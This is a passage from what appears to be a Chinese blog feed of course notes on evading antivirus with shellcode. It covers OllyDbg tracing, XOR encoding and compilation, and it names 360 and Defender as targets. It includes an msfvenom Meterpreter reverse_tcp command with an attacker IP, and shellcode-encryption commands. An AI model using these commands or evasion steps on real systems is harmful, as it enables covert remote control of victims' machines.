src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154232144.png" alt="image-20230428154232144"></p><h5 id="用SuperSoft工具编码"><a href="#用SuperSoft工具编码" class="headerlink" title="用SuperSoft工具编码"></a>用SuperSoft工具编码</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154255080.png" alt="image-20230428154255080"></p><h5 id="将编码后的内容重新赋值给新变量然后解码"><a href="#将编码后的内容重新赋值给新变量然后解码" class="headerlink" title="将编码后的内容重新赋值给新变量然后解码"></a>将编码后的内容重新赋值给新变量然后解码</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154605817.png" alt="image-20230428154605817"></p><h5 id="执行后，打印出了加密后的shellcode内容"><a href="#执行后，打印出了加密后的shellcode内容" class="headerlink" title="执行后，打印出了加密后的shellcode内容"></a>执行后，打印出了加密后的shellcode内容</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428161047124.png" alt="image-20230428161047124"></p><h5 id="复制到解密上线脚本，最后再用这个打包"><a href="#复制到解密上线脚本，最后再用这个打包" class="headerlink" title="复制到解密上线脚本，最后再用这个打包"></a>复制到解密上线脚本，最后再用这个打包</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428161133813.png" alt="image-20230428161133813"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day107 免杀对抗-C&amp;C++&amp;溯源ShellCode上线&amp;混淆变异算法&amp;回调编译执行</title>
    <link href="http://example.com/2023/04/27/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/04/27/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/</id>
    <published>2023-04-27T00:33:12.000Z</published>
    <updated>2023-05-02T12:25:55.547Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、ShellCode-分析&amp;朔源&amp;感知</p><p>2、ShellCode-混淆&amp;编码&amp;算法</p><p>3、回调执行解析-API&amp;汇编&amp;句柄</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源"><a href="#➢-C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源" class="headerlink" title="➢ C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源"></a>➢ C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源</h4><h4 id="➢-C-x2F-C-ShellCode变异-编码混淆加密算法"><a href="#➢-C-x2F-C-ShellCode变异-编码混淆加密算法" class="headerlink" title="➢ C&#x2F;C++-ShellCode变异-编码混淆加密算法"></a>➢ C&#x2F;C++-ShellCode变异-编码混淆加密算法</h4><h4 id="➢-C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等"><a href="#➢-C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等" class="headerlink" title="➢ C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等"></a>➢ C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</h4></blockquote><h3 id="C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源"><a href="#C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源" class="headerlink" title="#C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源"></a>#C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源</h3><h5 id="1、EXE朔源-IP及端口-杀毒分析"><a href="#1、EXE朔源-IP及端口-杀毒分析" class="headerlink" title="1、EXE朔源-IP及端口-杀毒分析"></a>1、EXE朔源-IP及端口-杀毒分析</h5><h5 id="2、编译修改-IP及端口-威胁感知"><a href="#2、编译修改-IP及端口-威胁感知" class="headerlink" title="2、编译修改-IP及端口-威胁感知"></a>2、编译修改-IP及端口-威胁感知</h5><h5 id="reverse-tcp-asm"><a href="#reverse-tcp-asm" class="headerlink" title="reverse_tcp.asm"></a>reverse_tcp.asm</h5><p><a href="https://www.cnblogs.com/Akkuman/p/12859091.html">metasploit payload运行原理浅析(sockedi调用约定是什么) - Akkuman - 博客园 (cnblogs.com)</a></p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427105300454.png" alt="image-20230427105300454"></p><h5 id="可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀"><a href="#可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀" class="headerlink" title="可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀"></a>可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀</h5><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427105606074.png" alt="image-20230427105606074"></p><h5 id="木马源代码：shellcode-解析器"><a href="#木马源代码：shellcode-解析器" class="headerlink" title="木马源代码：shellcode+解析器"></a>木马源代码：shellcode+解析器</h5><h6 id="shellcode-buf"><a href="#shellcode-buf" class="headerlink" title="shellcode  buf"></a>shellcode  buf</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427115037989.png" alt="image-20230427115037989"></p><h6 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427115135476.png" alt="image-20230427115135476"></p><h6 id="用cs或者msf生成的payload-c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题"><a href="#用cs或者msf生成的payload-c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题" class="headerlink" title="用cs或者msf生成的payload.c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题"></a>用cs或者msf生成的payload.c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427104424543.png" alt="image-20230427104424543"></p><h4 id="下面分析杀毒软件的原理：（反编译逆向分析）"><a href="#下面分析杀毒软件的原理：（反编译逆向分析）" class="headerlink" title="下面分析杀毒软件的原理：（反编译逆向分析）"></a>下面分析杀毒软件的原理：（反编译逆向分析）</h4><h6 id="msf的模块都对应着shellcode"><a href="#msf的模块都对应着shellcode" class="headerlink" title="msf的模块都对应着shellcode"></a>msf的模块都对应着shellcode</h6><h6 id="链接里msf的shellcode的代码原理"><a href="#链接里msf的shellcode的代码原理" class="headerlink" title="链接里msf的shellcode的代码原理"></a>链接里msf的shellcode的代码原理</h6><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427110450838.png" alt="image-20230427110450838"></p><h6 id="shellcode先执行call-eax再进入buf核心语句"><a href="#shellcode先执行call-eax再进入buf核心语句" class="headerlink" title="shellcode先执行call eax再进入buf核心语句"></a>shellcode先执行call eax再进入buf核心语句</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111421064.png" alt="image-20230427111421064"></p><h6 id="用OllyDbg反编译exe"><a href="#用OllyDbg反编译exe" class="headerlink" title="用OllyDbg反编译exe"></a>用OllyDbg反编译exe</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111538014.png" alt="image-20230427111538014"></p><h6 id="尝试搜索上面github的代码call-ebp"><a href="#尝试搜索上面github的代码call-ebp" class="headerlink" title="尝试搜索上面github的代码call ebp"></a>尝试搜索上面github的代码call ebp</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112200943.png" alt="image-20230427112200943"></p><h6 id="再OllyDbg里面搜索"><a href="#再OllyDbg里面搜索" class="headerlink" title="再OllyDbg里面搜索"></a>再OllyDbg里面搜索</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112339612.png" alt="image-20230427112339612"></p><h6 id="显示未找到，这是因为要到CALL-EAX先执行才步入核心代码"><a href="#显示未找到，这是因为要到CALL-EAX先执行才步入核心代码" class="headerlink" title="显示未找到，这是因为要到CALL EAX先执行才步入核心代码"></a>显示未找到，这是因为要到CALL EAX先执行才步入核心代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112417280.png" alt="image-20230427112417280"></p><h6 id="找到上此处的CALL-EAX点击调试自动步入，进入核心代码"><a href="#找到上此处的CALL-EAX点击调试自动步入，进入核心代码" class="headerlink" title="找到上此处的CALL EAX点击调试自动步入，进入核心代码"></a>找到上此处的CALL EAX点击调试自动步入，进入核心代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111958790.png" alt="image-20230427111958790"></p><h6 id="再次搜索就能搜到了"><a href="#再次搜索就能搜到了" class="headerlink" title="再次搜索就能搜到了"></a>再次搜索就能搜到了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112545211.png" alt="image-20230427112545211"></p><h6 id="在github中再次找到代码的对应处"><a href="#在github中再次找到代码的对应处" class="headerlink" title="在github中再次找到代码的对应处"></a>在github中再次找到代码的对应处</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112709794.png" alt="image-20230427112709794"></p><h6 id="ip和端口对应着上面反编译后的两个PUSH前的16进制数"><a href="#ip和端口对应着上面反编译后的两个PUSH前的16进制数" class="headerlink" title="ip和端口对应着上面反编译后的两个PUSH前的16进制数"></a>ip和端口对应着上面反编译后的两个PUSH前的16进制数</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113332782.png" alt="image-20230427113332782"></p><h6 id="将其解码出来，可以发现就是ip和端口"><a href="#将其解码出来，可以发现就是ip和端口" class="headerlink" title="将其解码出来，可以发现就是ip和端口"></a>将其解码出来，可以发现就是ip和端口</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113408528.png" alt="image-20230427113408528"></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113505805.png" alt="image-20230427113505805"></p><h6 id="在shellcode的buf代码里面"><a href="#在shellcode的buf代码里面" class="headerlink" title="在shellcode的buf代码里面"></a>在shellcode的buf代码里面</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427114213433.png" alt="image-20230427114213433"></p><h6 id="这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译"><a href="#这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译" class="headerlink" title="这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译"></a>这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113551511.png" alt="image-20230427113551511"></p><h3 id="C-x2F-C-ShellCode变异-编码混淆加密算法"><a href="#C-x2F-C-ShellCode变异-编码混淆加密算法" class="headerlink" title="#C&#x2F;C++-ShellCode变异-编码混淆加密算法"></a>#C&#x2F;C++-ShellCode变异-编码混淆加密算法</h3><h6 id="加密shellcode（buf）方法：Xor-Aes-Hex-Rc4-Rsa等"><a href="#加密shellcode（buf）方法：Xor-Aes-Hex-Rc4-Rsa等" class="headerlink" title="加密shellcode（buf）方法：Xor Aes Hex Rc4 Rsa等"></a>加密shellcode（buf）方法：Xor Aes Hex Rc4 Rsa等</h6><p><a href="https://github.com/Arno0x/ShellcodeWrapper">https://github.com/Arno0x/ShellcodeWrapper</a></p><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw</h5><h5 id="网上写好的加密脚本：shellcode-encoder-py"><a href="#网上写好的加密脚本：shellcode-encoder-py" class="headerlink" title="网上写好的加密脚本：shellcode_encoder.py"></a>网上写好的加密脚本：shellcode_encoder.py</h5><h5 id="1、XOR加密：python2-shellcode-encoder-py-cpp-cs-py-payload-bin-xiaodi-xor"><a href="#1、XOR加密：python2-shellcode-encoder-py-cpp-cs-py-payload-bin-xiaodi-xor" class="headerlink" title="1、XOR加密：python2 shellcode_encoder.py -cpp -cs -py payload.bin xiaodi xor"></a>1、XOR加密：python2 shellcode_encoder.py -cpp -cs -py payload.bin xiaodi xor</h5><h5 id="CS-amp-MSF"><a href="#CS-amp-MSF" class="headerlink" title="CS&amp;MSF"></a>CS&amp;MSF</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw-1"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw-1" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw</h5><h6 id="用CS或者MSF都可以生成一个Raw文件"><a href="#用CS或者MSF都可以生成一个Raw文件" class="headerlink" title="用CS或者MSF都可以生成一个Raw文件"></a>用CS或者MSF都可以生成一个Raw文件</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427142925481.png" alt="image-20230427142925481"></p><h6 id="生成为payload-bin"><a href="#生成为payload-bin" class="headerlink" title="生成为payload.bin"></a>生成为payload.bin</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143056002.png" alt="image-20230427143056002"></p><h6 id="执行后加密生成了三种后缀的代码"><a href="#执行后加密生成了三种后缀的代码" class="headerlink" title="执行后加密生成了三种后缀的代码"></a>执行后加密生成了三种后缀的代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143511612.png" alt="image-20230427143511612"></p><h6 id="打开其中的cpp代码"><a href="#打开其中的cpp代码" class="headerlink" title="打开其中的cpp代码"></a>打开其中的cpp代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143839117.png" alt="image-20230427143839117"></p><h6 id="进行编译打包成exe后，还是被杀毒软件杀了"><a href="#进行编译打包成exe后，还是被杀毒软件杀了" class="headerlink" title="进行编译打包成exe后，还是被杀毒软件杀了"></a>进行编译打包成exe后，还是被杀毒软件杀了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144045998.png" alt="image-20230427144045998"></p><h5 id="自己写的加密脚本：xor-py"><a href="#自己写的加密脚本：xor-py" class="headerlink" title="自己写的加密脚本：xor.py"></a>自己写的加密脚本：xor.py</h5><h6 id="加密shellcode："><a href="#加密shellcode：" class="headerlink" title="加密shellcode："></a>加密shellcode：</h6><h6 id="python-xor-py-s-shellcode-bin-d-payload-c-n-10-r-out-bin（生成payload-c）"><a href="#python-xor-py-s-shellcode-bin-d-payload-c-n-10-r-out-bin（生成payload-c）" class="headerlink" title="python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin（生成payload.c）"></a>python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin（生成payload.c）</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144317457.png" alt="image-20230427144317457"></p><h6 id="payload-c"><a href="#payload-c" class="headerlink" title="payload.c"></a>payload.c</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144410786.png" alt="image-20230427144410786"></p><h6 id="编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些"><a href="#编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些" class="headerlink" 